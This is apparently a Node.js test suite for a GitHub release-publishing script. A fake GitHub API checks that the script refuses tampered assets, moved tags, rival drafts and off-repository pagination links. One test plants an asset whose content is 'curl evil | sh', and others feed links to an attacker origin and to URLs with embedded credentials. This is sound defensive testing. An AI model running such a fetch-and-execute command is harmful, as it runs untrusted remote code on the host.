import test from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  ReleaseError,
  createGitHubClient,
  isPrereleaseTag,
  loadReleaseAssets,
  preflightRelease,
  publishRelease,
  validateRepo,
  validateTag,
} from "../../.github/scripts/publish-release.mjs";

const SCRIPT = fileURLToPath(new URL("../../.github/scripts/publish-release.mjs", import.meta.url));
const REPO = "ethanolivertroy/grclanker";
const TAG = "v1.2.3";
const COMMIT = "a".repeat(40);
const OTHER_COMMIT = "b".repeat(40);
const TAG_OBJECT = "c".repeat(40);
const API = "https://api.github.com";
const UPLOADS = "https://uploads.github.com";
const REPO_PATH = `/repos/${REPO}`;
const REPO_ID = 1194941512;
const CANONICAL_PATH = `/repositories/${REPO_ID}`;

function sha256(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}

function json(status, data, headers = {}) {
  return new Response(JSON.stringify(data), { status, headers: { "content-type": "application/json", ...headers } });
}

// In-memory stand-in for the parts of the GitHub REST API the publisher calls.
// Like GitHub, it serves /repositories/{id}/... and uses that form in next links
// unless canonicalLinks is false. Hooks let a test mutate state around a request
// to simulate concurrent writers.
class FakeGitHub {
  constructor({ pageSize = 100, canonicalLinks = true } = {}) {
    this.pageSize = pageSize;
    this.canonicalLinks = canonicalLinks;
    this.nextId = 1000;
    this.releases = [];
    this.refs = new Map([[TAG, { type: "tag", sha: TAG_OBJECT }]]);
    this.tagObjects = new Map([[TAG_OBJECT, { type: "commit", sha: COMMIT }]]);
    this.requests = [];
    this.before = null;
    this.after = null;
    this.fetch = this.fetch.bind(this);
  }

  addRelease(fields) {
    const release = {
      id: this.nextId++,
      tag_name: TAG,
      name: "",
      body: "",
      draft: false,
      prerelease: true,
      assets: [],
      ...fields,
    };
    release.html_url = `https://github.com/${REPO}/releases/${release.id}`;
    this.releases.push(release);
    return release;
  }

  addAsset(release, name, bytes) {
    const asset = {
      id: this.nextId++,
      name,
      state: "uploaded",
      size: bytes.length,
      digest: `sha256:${sha256(bytes)}`,
    };
    release.assets.push(asset);
    return asset;
  }

  release(id) {
    return this.releases.find((release) => release.id === id);
  }

  count(method, pattern) {
    return this.requests.filter((req) => req.method === method && pattern.test(req.path)).length;
  }

  view(release) {
    const { assets, ...rest } = release;
    return { ...rest, assets: assets.map((asset) => ({ ...asset })) };
  }

  page(url, items) {
    const page = Number(url.searchParams.get("page") ?? "1");
    const start = (page - 1) * this.pageSize;
    const headers = {};
    if (start + this.pageSize < items.length) {
      const next = new URL(url);
      if (this.canonicalLinks) {
        next.pathname = next.pathname.replace(REPO_PATH, CANONICAL_PATH);
      }
      next.searchParams.set("page", String(page + 1));
      headers.link = `<${next}>; rel="next", <${url.origin}${url.pathname}?page=1>; rel="first"`;
    }
    return json(200, items.slice(start, start + this.pageSize), headers);
  }

  async fetch(input, init = {}) {
    const url = new URL(input);
    const req = {
      method: init.method ?? "GET",
      url,
      origin: url.origin,
      path: url.pathname,
      headers: init.headers ?? {},
      redirect: init.redirect,
      body: init.body,
    };
    this.requests.push(req);
    const override = this.before?.(req, this);
    if (override) {
      return override;
    }
    const response = this.route(req);
    this.after?.(req, this, response);
    return response;
  }

  route({ method, url, origin, path, body }) {
    if (origin === UPLOADS) {
      const match = new RegExp(`^${REPO_PATH}/releases/(\\d+)/assets$`).exec(path);
      const release = match && this.release(Number(match[1]));
      if (method !== "POST" || !release) {
        return json(404, { message: "Not Found" });
      }
      const name = url.searchParams.get("name");
      if (release.assets.some((asset) => asset.name === name)) {
        return json(422, { message: "Validation Failed", errors: [{ code: "already_exists", field: "name" }] });
      }
      return json(201, this.addAsset(release, name, Buffer.from(body)));
    }
    if (origin === API && path.startsWith(`${CANONICAL_PATH}/`)) {
      path = `${REPO_PATH}${path.slice(CANONICAL_PATH.length)}`;
    }
    if (origin === API && method === "GET" && path === REPO_PATH) {
      return json(200, { id: REPO_ID, full_name: REPO });
    }
    if (origin !== API || !path.startsWith(`${REPO_PATH}/`)) {
      return json(404, { message: "Not Found" });
    }
    const rest = path.slice(REPO_PATH.length);
    let match;

    if (method === "GET" && (match = /^\/git\/ref\/tags\/(.+)$/.exec(rest))) {
      const tag = decodeURIComponent(match[1]);
      const object = this.refs.get(tag);
      return object ? json(200, { ref: `refs/tags/${tag}`, object }) : json(404, { message: "Not Found" });
    }
    if (method === "GET" && (match = /^\/git\/tags\/([0-9a-f]{40})$/.exec(rest))) {
      const object = this.tagObjects.get(match[1]);
      return object ? json(200, { sha: match[1], object }) : json(404, { message: "Not Found" });
    }
    if (method === "GET" && (match = /^\/releases\/tags\/(.+)$/.exec(rest))) {
      const tag = decodeURIComponent(match[1]);
      const release = this.releases.filter((r) => r.tag_name === tag && !r.draft).at(-1);
      return release ? json(200, this.view(release)) : json(404, { message: "Not Found" });
    }
    if (method === "GET" && rest === "/releases") {
      const newestFirst = [...this.releases].reverse().map((release) => this.view(release));
      return this.page(url, newestFirst);
    }
    if (method === "POST" && rest === "/releases") {
      const payload = JSON.parse(body);
      if (this.releases.some((r) => r.tag_name === payload.tag_name && !r.draft)) {
        return json(422, { message: "Validation Failed", errors: [{ code: "already_exists", field: "tag_name" }] });
      }
      this.lastCreate = payload;
      const { tag_name, name, body: notes, draft, prerelease } = payload;
      return json(201, this.view(this.addRelease({ tag_name, name, body: notes, draft, prerelease })));
    }
    if ((match = /^\/releases\/(\d+)(\/assets)?$/.exec(rest))) {
      const release = this.release(Number(match[1]));
      if (!release) {
        return json(404, { message: "Not Found" });
      }
      if (match[2]) {
        return method === "GET" ? this.page(url, release.assets.map((asset) => ({ ...asset }))) : json(404, {});
      }
      if (method === "GET") {
        return json(200, this.view(release));
      }
      if (method === "PATCH") {
        Object.assign(release, JSON.parse(body));
        return json(200, this.view(release));
      }
      if (method === "DELETE") {
        this.releases = this.releases.filter((r) => r !== release);
        return new Response(null, { status: 204 });
      }
    }
    return json(404, { message: "Not Found" });
  }
}

function writeAssets(files) {
  const dir = mkdtempSync(join(tmpdir(), "grclanker-release-publish-"));
  let sums = "";
  for (const [name, contents] of Object.entries(files)) {
    writeFileSync(join(dir, name), contents);
    sums += `${sha256(Buffer.from(contents))}  ${name}\n`;
  }
  writeFileSync(join(dir, "SHA256SUMS.txt"), sums);
  return dir;
}

function setup(t, { pageSize, tag = TAG } = {}) {
  const dir = writeAssets({
    "grclanker-1.2.3-linux-x64.tar.gz": "linux archive bytes",
    "grclanker-1.2.3-win32-x64.zip": "windows archive bytes",
  });
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const github = new FakeGitHub({ pageSize });
  if (tag !== TAG) {
    github.refs.set(tag, { type: "commit", sha: COMMIT });
  }
  const client = createGitHubClient({ token: "test-token", repo: REPO, fetchImpl: github.fetch });
  const assets = loadReleaseAssets(dir);
  const logs = [];
  const run = () =>
    publishRelease({
      client,
      tag,
      sha: COMMIT,
      name: `GRC Clanker ${tag}`,
      notes: "notes",
      assets,
      log: (message) => logs.push(message),
    });
  return { dir, github, client, assets, logs, run };
}

function isUpload(req) {
  return req.origin === UPLOADS && req.method === "POST";
}

async function rejectsWith(promise, pattern) {
  await assert.rejects(promise, (error) => {
    assert.ok(error instanceof ReleaseError, `expected ReleaseError, got ${error}`);
    assert.match(error.message, pattern);
    return true;
  });
}

test("publishes one new release with exactly the verified assets", async (t) => {
  const { github, assets, run } = setup(t, { pageSize: 1 });
  const other = github.addRelease({ tag_name: "v1.2.2" });
  github.addAsset(other, "old.zip", Buffer.from("old"));

  const { id, htmlUrl } = await run();

  const release = github.release(id);
  assert.equal(release.draft, false);
  assert.equal(release.prerelease, false);
  assert.equal(release.make_latest, "true");
  assert.equal(release.tag_name, TAG);
  assert.equal(htmlUrl, release.html_url);
  assert.deepEqual(
    release.assets.map((asset) => `${asset.name} ${asset.digest}`).sort(),
    assets.map((asset) => `${asset.name} sha256:${asset.digest}`).sort(),
  );
  assert.equal(github.lastCreate.draft, true);
  assert.equal(github.lastCreate.prerelease, false);
  assert.equal(github.lastCreate.make_latest, "false", "the draft is not marked latest before its assets are verified");
  assert.equal(github.lastCreate.target_commitish, COMMIT);
  assert.equal(github.count("DELETE", /./), 0);

  const patchIndex = github.requests.findIndex((req) => req.method === "PATCH");
  const lastUpload = github.requests.findLastIndex(isUpload);
  assert.ok(lastUpload < patchIndex, "uploads finish before publishing");
  assert.equal(github.requests.filter(isUpload).length, assets.length);
  for (const req of github.requests.filter(isUpload)) {
    assert.equal(req.path, `${REPO_PATH}/releases/${id}/assets`);
  }
  assert.ok(github.requests.some((req) => req.path === `${REPO_PATH}/git/tags/${TAG_OBJECT}`), "dereferences the annotated tag");
  for (const req of github.requests) {
    assert.equal(req.redirect, "error");
    assert.equal(req.headers.Authorization, "Bearer test-token");
    assert.equal(req.headers["X-GitHub-Api-Version"], "2022-11-28");
  }
});

test("a tag with a prerelease suffix publishes a prerelease that is never marked latest", async (t) => {
  const { github, run } = setup(t, { tag: "v1.2.3-rc.1" });
  const { id } = await run();
  const release = github.release(id);
  assert.equal(release.tag_name, "v1.2.3-rc.1");
  assert.equal(release.draft, false);
  assert.equal(release.prerelease, true);
  assert.equal(release.make_latest, "false");
  assert.equal(github.lastCreate.prerelease, true);
});

test("post-publish verification catches a prerelease turned into a full release", async (t) => {
  const { github, run } = setup(t, { tag: "v1.2.3-rc.1" });
  github.after = (req, gh) => {
    if (req.method === "PATCH") {
      gh.release(Number(req.path.split("/").at(-1))).prerelease = false;
    }
  };
  await rejectsWith(run(), /was published but failed post-publish verification[\s\S]*prerelease=true/);
});

test("encodes asset names in the upload query and uses the GHES upload path", async () => {
  const seen = [];
  const client = createGitHubClient({
    apiUrl: "https://ghe.example.com/api/v3",
    token: "t",
    repo: REPO,
    fetchImpl: async (url) => {
      seen.push(new URL(url));
      return json(404, { message: "Not Found" });
    },
  });
  await rejectsWith(client.uploadAsset(7, "a b&c=d.zip", Buffer.from("x")), /returned HTTP 404, expected 201/);
  assert.equal(seen[0].origin, "https://ghe.example.com");
  assert.equal(seen[0].pathname, `/api/uploads${REPO_PATH}/releases/7/assets`);
  assert.equal(seen[0].searchParams.get("name"), "a b&c=d.zip");
  assert.match(seen[0].search, /^\?name=a\+b%26c%3Dd\.zip$/);

  assert.equal(await client.releaseForTag("v1.0.0"), null);
  assert.equal(seen[1].pathname, `/api/v3${REPO_PATH}/releases/tags/v1.0.0`);
});

test("preflight refuses an existing published release", async (t) => {
  const { github, run } = setup(t);
  github.addRelease({ draft: false });
  await rejectsWith(run(), /already exists for v1\.2\.3/);
  assert.equal(github.count("POST", /\/releases$/), 0);
});

test("preflight finds an existing draft on a later page", async (t) => {
  const { github, run } = setup(t, { pageSize: 1 });
  github.addRelease({ draft: true });
  github.addRelease({ tag_name: "v1.2.2" });
  github.addRelease({ tag_name: "v1.2.1" });
  await rejectsWith(run(), /A release already exists for v1\.2\.3: id=\d+ draft=true/);
  assert.equal(github.count("POST", /\/releases$/), 0);
});

for (const [label, status] of [
  ["a server error", 500],
  ["an auth failure", 401],
  ["a redirect", 301],
]) {
  test(`preflight fails closed on ${label} from the tag lookup`, async (t) => {
    const { github, run } = setup(t);
    github.before = (req) => (req.path.includes("/releases/tags/") ? json(status, { message: "nope" }) : null);
    await rejectsWith(run(), new RegExp(`returned HTTP ${status}, expected 200 or 404: nope`));
    assert.equal(github.count("POST", /\/releases$/), 0);
  });
}

test("preflight fails closed on a transport error and on a non-JSON body", async (t) => {
  const { github, run } = setup(t);
  github.before = (req) => {
    if (req.path === `${REPO_PATH}/releases`) {
      throw new TypeError("fetch failed");
    }
    return null;
  };
  await rejectsWith(run(), /GET \/repos\/ethanolivertroy\/grclanker\/releases failed: fetch failed/);

  github.before = (req) => (req.path === `${REPO_PATH}/releases` ? new Response("<html>", { status: 200 }) : null);
  await rejectsWith(run(), /returned a non-JSON body/);
  assert.equal(github.count("POST", /\/releases$/), 0);
});

test("follows canonical /repositories/{id} next links on release and asset lists", async (t) => {
  const { github, run } = setup(t, { pageSize: 1 });
  github.addRelease({ tag_name: "v1.2.1" });
  github.addRelease({ tag_name: "v1.2.2" });

  const { id } = await run();

  const canonicalGets = github.requests.filter((req) => req.method === "GET" && req.path.startsWith(`${CANONICAL_PATH}/`));
  assert.ok(canonicalGets.some((req) => req.path === `${CANONICAL_PATH}/releases`));
  assert.ok(canonicalGets.some((req) => req.path === `${CANONICAL_PATH}/releases/${id}/assets`));
  assert.ok(canonicalGets.every((req) => Number(req.url.searchParams.get("page")) >= 2));
  assert.equal(github.count("GET", new RegExp(`^${REPO_PATH}$`)), 1, "repository ID is looked up once");
  assert.equal(github.release(id).draft, false);
});

test("next links in the /repos/{owner}/{repo} form need no repository lookup", async (t) => {
  const { github, run } = setup(t, { pageSize: 1 });
  github.canonicalLinks = false;
  github.addRelease({ tag_name: "v1.2.2" });
  await run();
  assert.equal(github.count("GET", new RegExp(`^${REPO_PATH}$`)), 0);
  assert.equal(github.count("GET", /^\/repositories\//), 0);
});

const LISTS = {
  "release list": (req) => req.method === "GET" && req.origin === API && req.path === `${REPO_PATH}/releases`,
  "asset list": (req) => req.method === "GET" && req.origin === API && /^\/repos\/[^/]+\/[^/]+\/releases\/\d+\/assets$/.test(req.path),
};

const BAD_LINKS = {
  "another repository ID": (resource) => `${API}/repositories/${REPO_ID + 1}${resource}`,
  "a zero-padded repository ID": (resource) => `${API}/repositories/0${REPO_ID}${resource}`,
  "dot segments into another ID": (resource) => `${API}${CANONICAL_PATH}/../${REPO_ID + 1}${resource}`,
  "another repository name": (resource) => `${API}/repos/someone/else${resource}`,
  "another resource in this repository": () => `${API}${CANONICAL_PATH}/contents/README.md`,
  "another origin": (resource) => `https://evil.example.com${CANONICAL_PATH}${resource}`,
  "the uploads origin": (resource) => `${UPLOADS}${CANONICAL_PATH}${resource}`,
  "plain http": (resource) => `http://api.github.com${CANONICAL_PATH}${resource}`,
  "embedded credentials": (resource) => `https://user:pass@api.github.com${CANONICAL_PATH}${resource}`,
};

for (const [listName, isList] of Object.entries(LISTS)) {
  for (const [linkName, linkFor] of Object.entries(BAD_LINKS)) {
    test(`${listName} pagination rejects a next link to ${linkName}`, async (t) => {
      const { github, run } = setup(t);
      github.before = (req, gh) => {
        if (!isList(req)) {
          return null;
        }
        const resource = req.path.slice(REPO_PATH.length);
        const first = gh.route(req);
        return new Response(first.body, { status: 200, headers: { link: `<${linkFor(resource)}?page=2>; rel="next"` } });
      };
      await rejectsWith(run(), /Pagination link for .* points outside this repository's \/releases/);
      assert.equal(github.requests.filter((req) => req.url.searchParams.get("page") === "2").length, 0, "never follows the link");
      assert.equal(github.count("PATCH", /./), 0);
      assert.equal(github.releases.length, 0, "any draft we created is deleted");
    });
  }
}

for (const [label, response] of [
  ["another repository's name", () => json(200, { id: REPO_ID, full_name: "someone/else" })],
  ["a non-numeric ID", () => json(200, { id: String(REPO_ID), full_name: REPO })],
  ["a redirect for a renamed repository", () => json(301, { message: "Moved Permanently" })],
  ["an auth failure", () => json(401, { message: "Bad credentials" })],
]) {
  test(`canonical pagination fails closed when the repository lookup returns ${label}`, async (t) => {
    const { github, run } = setup(t, { pageSize: 1 });
    github.addRelease({ tag_name: "v1.2.1" });
    github.addRelease({ tag_name: "v1.2.2" });
    github.before = (req) => (req.method === "GET" && req.path === REPO_PATH ? response() : null);
    await rejectsWith(run(), /GET \/repos\/ethanolivertroy\/grclanker (returned|did not return)/);
    assert.equal(github.count("GET", /^\/repositories\//), 0);
    assert.equal(github.count("POST", /\/releases$/), 0);
  });
}

test("the repository lookup accepts GitHub's case-insensitive full name", async (t) => {
  const { github, run } = setup(t, { pageSize: 1 });
  github.addRelease({ tag_name: "v1.2.2" });
  github.before = (req) =>
    req.method === "GET" && req.path === REPO_PATH ? json(200, { id: REPO_ID, full_name: "EthanOliverTroy/GRClanker" }) : null;
  await run();
});

test("preflight refuses a tag that does not point at the workflow commit", async (t) => {
  const { github, run } = setup(t);
  github.tagObjects.set(TAG_OBJECT, { type: "commit", sha: OTHER_COMMIT });
  await rejectsWith(run(), /not the workflow commit/);
  assert.equal(github.count("POST", /\/releases$/), 0);
});

test("a release created between preflight and create stops the run with no uploads", async (t) => {
  const { github, run } = setup(t);
  github.before = (req, gh) => {
    if (req.method === "POST" && req.path === `${REPO_PATH}/releases`) {
      gh.addRelease({ draft: false });
    }
    return null;
  };
  await rejectsWith(run(), /POST \/repos\/ethanolivertroy\/grclanker\/releases returned HTTP 422/);
  assert.equal(github.requests.filter(isUpload).length, 0);
  assert.equal(github.count("DELETE", /./), 0);
  assert.equal(github.releases.length, 1);
});

test("a duplicate draft for the tag blocks publishing and discards only our draft", async (t) => {
  const { github, run } = setup(t);
  let rival;
  github.after = (req, gh) => {
    if (isUpload(req) && !rival) {
      rival = gh.addRelease({ draft: true });
    }
  };
  await rejectsWith(run(), /to be the only release for v1\.2\.3, found \[\d+, \d+\]/);
  assert.equal(github.count("PATCH", /./), 0);
  assert.deepEqual(
    github.releases.map((release) => release.id),
    [rival.id],
  );
});

test("an extra asset added concurrently to our draft blocks publishing", async (t) => {
  const { github, run } = setup(t);
  github.after = (req, gh, response) => {
    if (isUpload(req) && response.status === 201 && gh.requests.filter(isUpload).length === 2) {
      gh.addAsset(gh.releases.at(-1), "evil.sh", Buffer.from("curl evil | sh"));
    }
  };
  await rejectsWith(run(), /assets do not match the verified bundles[\s\S]*evil\.sh/);
  assert.equal(github.count("PATCH", /./), 0);
  assert.equal(github.releases.length, 0);
});

test("an asset planted under our name before upload fails the upload", async (t) => {
  const { github, assets, run } = setup(t);
  github.after = (req, gh, response) => {
    if (req.method === "POST" && req.path === `${REPO_PATH}/releases` && response.status === 201) {
      gh.addAsset(gh.releases.at(-1), assets[0].name, Buffer.from("planted"));
    }
  };
  await rejectsWith(run(), /assets returned HTTP 422, expected 201: Validation Failed/);
  assert.equal(github.count("PATCH", /./), 0);
  assert.equal(github.releases.length, 0);
});

test("an upload that GitHub renames or records with another digest fails", async (t) => {
  const renamed = setup(t);
  renamed.github.before = (req) =>
    isUpload(req) ? json(201, { name: "default.zip", state: "uploaded", size: 1, digest: "sha256:0" }) : null;
  await rejectsWith(renamed.run(), /came back as "default\.zip"/);
  assert.equal(renamed.github.count("PATCH", /./), 0);

  const wrongDigest = setup(t);
  wrongDigest.github.before = (req) => {
    if (!isUpload(req)) {
      return null;
    }
    const name = req.url.searchParams.get("name");
    return json(201, { name, state: "uploaded", size: req.body.length, digest: `sha256:${"0".repeat(64)}` });
  };
  await rejectsWith(wrongDigest.run(), /GitHub recorded sha256:0{64}/);
  assert.equal(wrongDigest.github.count("PATCH", /./), 0);
});

test("assets listed without a digest fail closed", async (t) => {
  const { github, run } = setup(t);
  github.before = (req, gh) => {
    if (req.method === "GET" && /\/releases\/\d+\/assets$/.test(req.path)) {
      const release = gh.release(Number(req.path.split("/").at(-2)));
      return json(200, release.assets.map(({ digest, ...asset }) => asset));
    }
    return null;
  };
  await rejectsWith(run(), /digest=none/);
  assert.equal(github.count("PATCH", /./), 0);
});

test("a tag moved during upload blocks publishing", async (t) => {
  const { github, run } = setup(t);
  github.after = (req, gh) => {
    if (isUpload(req)) {
      gh.refs.set(TAG, { type: "commit", sha: OTHER_COMMIT });
    }
  };
  await rejectsWith(run(), /resolves to b{40}, not the workflow commit/);
  assert.equal(github.count("PATCH", /./), 0);
  assert.equal(github.releases.length, 0);
});

test("a failed publish request discards the draft", async (t) => {
  const { github, run } = setup(t);
  github.before = (req) => (req.method === "PATCH" ? json(502, { message: "Bad Gateway" }) : null);
  await rejectsWith(run(), /PATCH .* returned HTTP 502/);
  assert.equal(github.releases.length, 0);
});

test("a local file changed after verification is not uploaded", async (t) => {
  const { dir, github, assets, run } = setup(t);
  writeFileSync(assets[1].path, "swapped");
  await rejectsWith(run(), /changed on disk after it was verified/);
  assert.equal(github.requests.filter(isUpload).length, 1);
  assert.equal(github.releases.length, 0);
  assert.ok(readFileSync(join(dir, "SHA256SUMS.txt")).length > 0);
});

const POST_PUBLISH_MUTATIONS = {
  "an asset replaced": (gh, release) => {
    const index = release.assets.findIndex((asset) => asset.name.endsWith(".zip"));
    const name = release.assets[index].name;
    release.assets.splice(index, 1);
    gh.addAsset(release, name, Buffer.from("replaced"));
  },
  "an asset added": (gh, release) => {
    gh.addAsset(release, "extra.txt", Buffer.from("extra"));
  },
  "a duplicate release published": (gh) => {
    gh.addRelease({ draft: false });
  },
  "the release turned back into a draft": (gh, release) => {
    release.draft = true;
  },
  "the release turned into a prerelease": (gh, release) => {
    release.prerelease = true;
  },
  "the tag moved": (gh) => {
    gh.refs.set(TAG, { type: "commit", sha: OTHER_COMMIT });
  },
};

for (const [label, mutate] of Object.entries(POST_PUBLISH_MUTATIONS)) {
  test(`post-publish verification catches ${label}`, async (t) => {
    const { github, run } = setup(t);
    github.after = (req, gh) => {
      if (req.method === "PATCH") {
        mutate(gh, gh.release(Number(req.path.split("/").at(-1))));
      }
    };
    await rejectsWith(run(), /was published but failed post-publish verification; review it by hand/);
    assert.equal(github.count("DELETE", /./), 0);
    assert.equal(github.count("PATCH", /./), 1);
  });
}

test("loadReleaseAssets requires the directory to match SHA256SUMS.txt exactly", (t) => {
  const dir = writeAssets({ "a.tar.gz": "a", "b.zip": "b" });
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const assets = loadReleaseAssets(dir);
  assert.deepEqual(
    assets.map((asset) => asset.name),
    ["a.tar.gz", "b.zip", "SHA256SUMS.txt"],
  );
  assert.equal(assets[2].digest, sha256(readFileSync(join(dir, "SHA256SUMS.txt"))));

  writeFileSync(join(dir, "extra.zip"), "x");
  assert.throws(() => loadReleaseAssets(dir), /expected exactly/);
  rmSync(join(dir, "extra.zip"));

  writeFileSync(join(dir, "b.zip"), "tampered");
  assert.throws(() => loadReleaseAssets(dir), /b\.zip hashes to/);
  writeFileSync(join(dir, "b.zip"), "b");

  const sums = readFileSync(join(dir, "SHA256SUMS.txt"), "utf8");
  writeFileSync(join(dir, "SHA256SUMS.txt"), sums.trimEnd());
  assert.throws(() => loadReleaseAssets(dir), /must end with a newline/);
  writeFileSync(join(dir, "SHA256SUMS.txt"), `${sums}${sums.split("\n")[0]}\n`);
  assert.throws(() => loadReleaseAssets(dir), /Duplicate or reserved name/);
  writeFileSync(join(dir, "SHA256SUMS.txt"), sums.replace("  a.tar.gz", " *a.tar.gz"));
  assert.throws(() => loadReleaseAssets(dir), /Malformed SHA256SUMS\.txt line/);
});

test("rejects malformed tags, repositories, tokens, API URLs, and commits", async () => {
  for (const tag of ["1.2.3", "v1.2", "v1.2.3/../x", "v1.2.3 ", "v1.2.3-", "v1.2.3-a/b"]) {
    assert.throws(() => validateTag(tag), ReleaseError, tag);
  }
  assert.equal(validateTag("v1.2.3-rc.1"), "v1.2.3-rc.1");
  assert.equal(isPrereleaseTag("v1.2.3-rc.1"), true);
  assert.equal(isPrereleaseTag("v0.1.0"), false);
  assert.throws(() => isPrereleaseTag("latest"), ReleaseError);
  for (const repo of ["owner", "owner/repo/extra", "../repo", "owner/re po"]) {
    assert.throws(() => validateRepo(repo), ReleaseError, repo);
  }
  assert.throws(() => createGitHubClient({ token: "", repo: REPO }), /GH_TOKEN is not set/);
  assert.throws(() => createGitHubClient({ apiUrl: "http://api.github.com", token: "t", repo: REPO }), /must use https/);

  const github = new FakeGitHub();
  const client = createGitHubClient({ token: "t", repo: REPO, fetchImpl: github.fetch });
  await rejectsWith(preflightRelease({ client, tag: TAG, sha: "abc" }), /is not a full SHA/);
  assert.equal(github.requests.length, 0);
});

test("the CLI prints a workflow error and exits 1 on bad input", () => {
  const result = spawnSync(process.execPath, [SCRIPT, "preflight", "--repo", REPO, "--tag", "latest", "--sha", COMMIT], {
    encoding: "utf8",
    env: { PATH: process.env.PATH, GH_TOKEN: "t" },
  });
  assert.equal(result.status, 1);
  assert.match(result.stderr, /^::error::Tag "latest" is not a vMAJOR/);

  const noToken = spawnSync(process.execPath, [SCRIPT, "preflight", "--repo", REPO, "--tag", TAG, "--sha", COMMIT], {
    encoding: "utf8",
    env: { PATH: process.env.PATH },
  });
  assert.equal(noToken.status, 1);
  assert.match(noToken.stderr, /^::error::GH_TOKEN is not set/);
});
